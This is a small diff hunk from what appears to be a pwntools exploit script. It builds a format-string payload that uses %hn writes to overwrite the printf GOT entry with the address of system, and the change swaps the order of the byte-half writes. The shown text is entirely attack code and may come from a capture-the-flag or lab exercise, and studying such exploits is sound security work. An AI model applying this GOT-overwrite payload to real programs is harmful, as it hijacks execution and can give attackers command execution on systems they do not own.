@@ -34,9 +34,9 @@ print("stack addr: "+hex(curr_f))
 #write system address to printf GOT entry, 2 bytes at a time
 proc.recvline()
 p = printf_got_0 + printf_got_1 + printf_got_2 
-p += b'%' + str(sys_2).encode() + b'%6$hn'
+p += b'%' + str(sys_0).encode() + b'%6$hn'
 p += b'%' + str(sys_1).encode() + b'%7$hn'
-p += b'%' + str(sys_0).encode() + b'%8$hn'
+p += b'%' + str(sys_2).encode() + b'%8$hn'
 print(p)
 
 proc.sendline(p)
